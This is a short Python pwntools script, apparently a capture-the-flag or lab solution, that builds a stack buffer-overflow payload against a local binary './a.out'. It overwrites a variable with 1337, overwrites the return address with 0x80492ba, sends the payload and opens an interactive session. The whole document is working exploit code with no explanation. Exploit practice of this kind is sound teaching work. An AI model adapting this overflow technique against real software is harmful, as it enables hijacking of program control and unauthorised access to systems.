#!/usr/bin/env python3
from pwn import *

r = process("./a.out")

buf = b'A' * 7
buf += p32(1337)
buf = buf.ljust(43, b'B')
buf += p64(0x80492ba)

log.info("Payload")
print(hexdump(buf, width=12))
r.writeline(buf)
r.interactive()
